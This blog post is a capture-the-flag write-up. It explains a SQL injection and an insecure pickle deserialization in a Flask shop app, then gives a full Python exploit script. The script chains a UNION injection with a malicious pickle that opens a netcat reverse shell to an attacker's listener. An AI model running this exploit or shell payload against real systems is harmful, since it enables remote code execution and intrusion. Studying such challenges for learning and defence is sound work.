---
layout: default
title:  "Pickle Wickle"
date:   2022-09-20 11:12:00 -0500
categories: jekyll update
templateEngineOverride: md
permalink: /bloghub/picklewickle/
---

{% raw %}

## Introduction
In this challenge we will take advantage of Flask template filter which uses pickle library to deserialize a python object, but before, we have to analyze a simple SQL injection so we can pass our payload properly. 

## Finding the Bug 
The application is a simple shop web app that lists only four items.

![image](/assets/images/cop.png)

Looking at the web app routes we find two simple routes: 
```python 
@web.route('/')
def index():
    return render_template('index.html', products=shop.all_products())


@web.route('/view/<product_id>')
def product_details(product_id):
    with open('/tmp/record.log', 'a+') as file:
        file.write(shop.select_by_id(product_id))
    return render_template('item.html', product=shop.select_by_id(product_id))
``` 

The interesting part here is the product/s object which gets rendered to the templates, by the `shop.select_by_id()`, moving forward we can check for this function implementation:

```python 
class shop(object):

    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)

    @staticmethod
    def all_products():
        return query_db('SELECT * FROM products')    
``` 
the function select_by_id() lacks parametrization and hence is clearly SQLi vulnerable, but till this moment we still don't have interesting target to make use of this SQLi. 

## Never eat pickles!
Having a look at *app.py* we can see a Flask template filter defined that uses *pickle* library to load a base64 encoded object and deserialize it through *loads()*, then returns  back the object, as shown below: 
```python
@app.template_filter('pickle')
def pickle_loads(s):
	return pickle.loads(base64.b64decode(s))
```
Flask filters are called with the **|** notation inside templates, let's see *item.html*

```html
<div class="row gx-4 gx-lg-5 align-items-center">
                    {% set item = product | pickle %}
```

the product object returned from the SQL query is returned to the pickle filter decorator, which calls the *pickle_loads()* passing the returned value. 

## Eat the pickle, but ... cut the onion first.
pickling in python is a famous insecure way to handle python objects because of the code execution that may occur in the deserialization process, in our case we can pass the base64 encoded malicious pickle object in  the URL parameter of */view/<product_id>*, but we have to find a way to insure the payload is returned from the SQL query first! 

### Not onions, I mean UNION 
Yes, as you know, after injecting our payload after the where clause, we can simply add an UNION statement with our custom payload, making the structure of the SQL statement as follows: 
```SQL 
SELECT data FROM products WHERE id='20' UNION SELECT '<pickle payload>' -- -'
``` 
This will eventually return the pickled payload we send.

## The exploit 
I wrote a simple exploit script that dumps a malicious pickle object which returns a command execution upon deserialization, sets up the SQLi payload along with the Base64 object, and sends it through a GET request, all you have to do is set your listener, and expose your victim,
Happy Hacking. 

```python 
import pickle, os, base64
import sys
import requests
from urllib.parse import quote 

class P(object):
    
    def __init__(self, host, port): 
        self.host = host 
        self.port = port
    
    def __reduce__(self): 
        return (os.system,("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(self.host, self.port),))

if __name__ == "__main__": 
    
    try: 
        victim_url = sys.argv[1] 
        host = sys.argv[2] 
        port = sys.argv[3] 
        print("###### SENDING SHELL PAYLOAD ######")
        print('Make sure to setup your listener')
        if (not victim_url.startswith('http://') and not victim_url.startswith('https://')): 
            victim_url = 'http://' + victim_url   
        payload = victim_url + '/view/' + quote("1' UNION SELECT '{}' -- -".format(str(base64.b64encode(pickle.dumps(P(host, port))).decode())))
        response = requests.get(payload)     
    
    except: 
        print("Usage: python3 cop_exploit.py <victim> <listener host> <port>\n") 
        print("Example: python3 cop_exploit.py http://64.227.43.113:32298 6.tcp.ngrok.io 16451")
```
{% endraw %}